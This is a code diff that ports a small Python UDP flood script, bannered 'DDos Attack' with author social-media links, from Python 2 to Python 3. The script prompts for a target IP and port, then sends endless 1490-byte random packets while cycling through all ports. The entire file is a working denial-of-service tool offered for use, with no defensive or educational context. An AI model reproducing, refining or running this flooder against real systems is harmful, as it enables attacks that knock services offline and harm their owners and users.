@@ -3,8 +3,9 @@ import os
 import time
 import socket
 import random
-#Code Time
+# Code Time
 from datetime import datetime
+
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -17,35 +18,43 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+os.system("cls")
+print('''
+ ____  ____                 _   _   _             _    
+|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __
+| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
+| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   < 
+|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
+''')
+print("Author   : HA-MRX")
+print("You Tube : https://www.youtube.com/c/HA-MRX")
+print("GitHub   : https://github.com/Ha3MrX")
+print("Facebook : https://www.facebook.com/muhamad.jabar222")
+print("\n")
+ip = input("IP Target: ")
+port = int(input("Port     : "))
+
+os.system("cls")
+print("                     0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+os.system("cls")
+print("██                    25%")
 time.sleep(5)
-print "[==========          ] 50%"
+os.system("cls")
+print("██████████             50%")
 time.sleep(5)
-print "[===============     ] 75%"
+os.system("cls")
+print("███████████████████   75%")
 time.sleep(5)
-print "[====================] 100%"
+os.system("cls")
+print("█████████████████████ 100%")
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
-
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1
+    port = port + 1
+    print("Sent %s packet to %s throught port: %s." % (sent, ip, port))
+    if port == 65534:
+        port = 1
